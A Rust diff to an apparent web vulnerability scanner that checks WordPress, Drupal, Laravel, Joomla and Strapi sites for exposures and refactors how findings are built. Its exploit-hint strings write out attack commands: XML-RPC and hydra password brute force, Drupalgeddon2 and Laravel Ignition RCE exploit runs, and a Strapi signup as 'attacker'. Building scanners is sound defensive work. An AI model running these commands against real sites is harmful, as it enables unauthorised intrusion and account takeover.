@@ -41,10 +41,9 @@ async fn wordpress(client: &Client, base: &str, target: &Target) -> Vec<Finding>
     let url = format!("{}/wp-json/wp/v2/users", base);
     if let Ok(resp) = client.get(&url).send().await {
         if resp.status().as_u16() == 200 {
-            let body = resp.text().await.unwrap_or_default();
+            let body = gossan_core::net::bounded_text(resp, 4 * 1024 * 1024).await.unwrap_or_default();
             if body.contains("\"id\"") && body.contains("\"slug\"") {
-                f.push(
-                    crate::finding_builder(
+                gossan_core::try_push_finding(crate::info_finding(
                         target,
                         Severity::High,
                         "WordPress user enumeration via REST API",
@@ -57,7 +56,7 @@ async fn wordpress(client: &Client, base: &str, target: &Target) -> Vec<Finding>
                     .evidence(Evidence::HttpResponse {
                         status: 200,
                         headers: vec![],
-                        body_excerpt: Some(body.chars().take(400).collect()),
+                        body_excerpt: Some(body.chars().take(400).collect::<String>().into()),
                     })
                     .tag("wordpress")
                     .tag("user-enum")
@@ -65,10 +64,7 @@ async fn wordpress(client: &Client, base: &str, target: &Target) -> Vec<Finding>
                     .exploit_hint(format!(
                         "curl -s '{}/wp-json/wp/v2/users' | jq '.[].{{id,name,slug}}'",
                         base
-                    ))
-                    .build()
-                    .expect("finding builder: required fields are set"),
-                );
+                    )), &mut f);
             }
         }
     }
@@ -78,10 +74,9 @@ async fn wordpress(client: &Client, base: &str, target: &Target) -> Vec<Finding>
     if let Ok(resp) = client.get(&xmlrpc_url).send().await {
         let status = resp.status().as_u16();
         if status == 200 || status == 405 {
-            let body = resp.text().await.unwrap_or_default();
+            let body = gossan_core::net::bounded_text(resp, 4 * 1024 * 1024).await.unwrap_or_default();
             if body.contains("XML-RPC") || body.contains("xmlrpc") || status == 405 {
-                f.push(
-                    crate::finding_builder(
+                gossan_core::try_push_finding(crate::info_finding(
                         target,
                         Severity::Medium,
                         "WordPress XML-RPC enabled",
@@ -104,10 +99,7 @@ async fn wordpress(client: &Client, base: &str, target: &Target) -> Vec<Finding>
                         "# WPScan multicall brute force (no lockout):\n\
                          wpscan --url {} --passwords wordlist.txt --xmlrpc-brute-force",
                         base
-                    ))
-                    .build()
-                    .expect("finding builder: required fields are set"),
-                );
+                    )), &mut f);
             }
         }
     }
@@ -116,12 +108,11 @@ async fn wordpress(client: &Client, base: &str, target: &Target) -> Vec<Finding>
     let debug_url = format!("{}/wp-content/debug.log", base);
     if let Ok(resp) = client.get(&debug_url).send().await {
         if resp.status().as_u16() == 200 {
-            let body = resp.text().await.unwrap_or_default();
+            let body = gossan_core::net::bounded_text(resp, 4 * 1024 * 1024).await.unwrap_or_default();
             if (body.contains("PHP") || body.contains("WordPress") || body.contains("Fatal"))
                 && body.len() > 50
             {
-                f.push(
-                    crate::finding_builder(
+                gossan_core::try_push_finding(crate::info_finding(
                         target,
                         Severity::High,
                         "WordPress debug.log publicly readable",
@@ -134,14 +125,11 @@ async fn wordpress(client: &Client, base: &str, target: &Target) -> Vec<Finding>
                     .evidence(Evidence::HttpResponse {
                         status: 200,
                         headers: vec![],
-                        body_excerpt: Some(body.chars().take(300).collect()),
+                        body_excerpt: Some(body.chars().take(300).collect::<String>().into()),
                     })
                     .tag("wordpress")
                     .tag("log-exposure")
-                    .tag("exposure")
-                    .build()
-                    .expect("finding builder: required fields are set"),
-                );
+                    .tag("exposure"), &mut f);
             }
         }
     }
@@ -158,29 +146,26 @@ async fn drupal(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
     let url = format!("{}/CHANGELOG.txt", base);
     if let Ok(resp) = client.get(&url).send().await {
         if resp.status().as_u16() == 200 {
-            let body = resp.text().await.unwrap_or_default();
+            let body = gossan_core::net::bounded_text(resp, 4 * 1024 * 1024).await.unwrap_or_default();
             if body.contains("Drupal") {
                 let version = body
                     .lines()
                     .find(|l| l.trim().starts_with("Drupal"))
                     .map(|l| l.trim().to_string())
                     .unwrap_or_else(|| "Drupal (version unknown)".into());
-                f.push(
-                    crate::finding_builder(target, Severity::Medium,
+                gossan_core::try_push_finding(crate::info_finding(target, Severity::Medium,
                         "Drupal version disclosure via CHANGELOG.txt",
                         format!("CHANGELOG.txt reveals exact Drupal version: \"{}\". \
                                  Enables targeted CVE exploitation — Drupalgeddon2 (SA-CORE-2018-002, \
                                  CVSS 9.8) affects versions < 8.5.1.", version))
                     .evidence(Evidence::HttpResponse {
                         status: 200, headers: vec![],
-                        body_excerpt: Some(body.chars().take(200).collect()),
+                        body_excerpt: Some(body.chars().take(200).collect::<String>().into()),
                     })
                     .tag("drupal").tag("version-disclosure").tag("exposure")
                     .exploit_hint(format!(
                         "# Drupalgeddon2 (< 8.5.1 / < 7.58):\n\
-                         python3 drupalgeddon2.py -u {}", base))
-                    .build().expect("finding builder: required fields are set")
-                );
+                         python3 drupalgeddon2.py -u {}", base)), &mut f);
             }
         }
     }
@@ -189,10 +174,9 @@ async fn drupal(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
     let update_url = format!("{}/update.php", base);
     if let Ok(resp) = client.get(&update_url).send().await {
         if resp.status().as_u16() == 200 {
-            let body = resp.text().await.unwrap_or_default();
+            let body = gossan_core::net::bounded_text(resp, 4 * 1024 * 1024).await.unwrap_or_default();
             if body.contains("Drupal") || body.contains("database update") {
-                f.push(
-                    crate::finding_builder(
+                gossan_core::try_push_finding(crate::info_finding(
                         target,
                         Severity::High,
                         "Drupal update.php exposed",
@@ -209,10 +193,7 @@ async fn drupal(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
                         body_excerpt: None,
                     })
                     .tag("drupal")
-                    .tag("exposure")
-                    .build()
-                    .expect("finding builder: required fields are set"),
-                );
+                    .tag("exposure"), &mut f);
             }
         }
     }
@@ -229,7 +210,7 @@ async fn laravel(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
     let url = format!("{}/_ignition/health-check", base);
     if let Ok(resp) = client.get(&url).send().await {
         if resp.status().as_u16() == 200 {
-            let body = resp.text().await.unwrap_or_default();
+            let body = gossan_core::net::bounded_text(resp, 4 * 1024 * 1024).await.unwrap_or_default();
             if body.contains("can_execute_commands") || body.contains("ignition") {
                 let can_exec = body.contains("\"can_execute_commands\":true");
                 let sev = if can_exec {
@@ -237,8 +218,7 @@ async fn laravel(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
                 } else {
                     Severity::High
                 };
-                f.push(
-                    crate::finding_builder(target, sev,
+                gossan_core::try_push_finding(crate::info_finding(target, sev,
                         if can_exec {
                             "Laravel Ignition RCE — CVE-2021-3129 (can_execute_commands:true)"
                         } else {
@@ -250,16 +230,14 @@ async fn laravel(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
                                 if can_exec { " with shell execution enabled" } else { "" }))
                     .evidence(Evidence::HttpResponse {
                         status: 200, headers: vec![],
-                        body_excerpt: Some(body.chars().take(300).collect()),
+                        body_excerpt: Some(body.chars().take(300).collect::<String>().into()),
                     })
                     .tag("laravel").tag("rce").tag("cve-2021-3129")
                     .exploit_hint(format!(
                         "# CVE-2021-3129 — PHAR deserialization RCE:\n\
                          git clone https://github.com/ambionics/laravel-exploits\n\
                          php -d phar.readonly=0 phpggc Laravel/RCE5 'id' --phar phar -o /tmp/rce.phar\n\
-                         python3 laravel-exploits/laravel-ignition-rce.py {} /tmp/rce.phar", base))
-                    .build().expect("finding builder: required fields are set")
-                );
+                         python3 laravel-exploits/laravel-ignition-rce.py {} /tmp/rce.phar", base)), &mut f);
             }
         }
     }
@@ -275,10 +253,9 @@ async fn joomla(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
     let admin_url = format!("{}/administrator/", base);
     if let Ok(resp) = client.get(&admin_url).send().await {
         if resp.status().as_u16() == 200 {
-            let body = resp.text().await.unwrap_or_default();
+            let body = gossan_core::net::bounded_text(resp, 4 * 1024 * 1024).await.unwrap_or_default();
             if body.contains("Joomla") || body.contains("mod-login") {
-                f.push(
-                    crate::finding_builder(target, Severity::Medium,
+                gossan_core::try_push_finding(crate::info_finding(target, Severity::Medium,
                         "Joomla administrator panel exposed",
                         format!("{} is publicly accessible. The Joomla admin \
                                  backend is exposed to credential brute force and \
@@ -290,9 +267,7 @@ async fn joomla(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
                     .exploit_hint(format!(
                         "hydra -L users.txt -P passwords.txt {} http-post-form \
                          '/administrator/index.php:username=^USER^&passwd=^PASS^&task=login:F=Invalid'",
-                        base))
-                    .build().expect("finding builder: required fields are set")
-                );
+                        base)), &mut f);
             }
         }
     }
@@ -309,10 +284,9 @@ async fn strapi(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
     let admin_url = format!("{}/admin", base);
     if let Ok(resp) = client.get(&admin_url).send().await {
         if resp.status().as_u16() == 200 {
-            let body = resp.text().await.unwrap_or_default();
+            let body = gossan_core::net::bounded_text(resp, 4 * 1024 * 1024).await.unwrap_or_default();
             if body.contains("strapi") || body.contains("Strapi") {
-                f.push(
-                    crate::finding_builder(
+                gossan_core::try_push_finding(crate::info_finding(
                         target,
                         Severity::Medium,
                         "Strapi admin panel accessible",
@@ -329,10 +303,7 @@ async fn strapi(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
                     })
                     .tag("strapi")
                     .tag("admin-panel")
-                    .tag("exposure")
-                    .build()
-                    .expect("finding builder: required fields are set"),
-                );
+                    .tag("exposure"), &mut f);
             }
         }
     }
@@ -347,8 +318,7 @@ async fn strapi(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
         .await
     {
         if resp.status().as_u16() == 200 {
-            f.push(
-                crate::finding_builder(target, Severity::High,
+            gossan_core::try_push_finding(crate::info_finding(target, Severity::High,
                     "Strapi open user registration enabled",
                     format!("{} accepts new user signups without restriction. \
                              Attackers can self-register to gain authenticated API access \
@@ -360,9 +330,7 @@ async fn strapi(client: &Client, base: &str, target: &Target) -> Vec<Finding> {
                 .exploit_hint(format!(
                     "curl -s -X POST '{}' -H 'Content-Type: application/json' \\\n  \
                      -d '{{\"username\":\"attacker\",\"email\":\"a@evil.com\",\"password\":\"P@ssw0rd!\"}}' \\\n  \
-                     | jq .jwt", reg_url))
-                .build().expect("finding builder: required fields are set")
-            );
+                     | jq .jwt", reg_url)), &mut f);
         }
     }
 
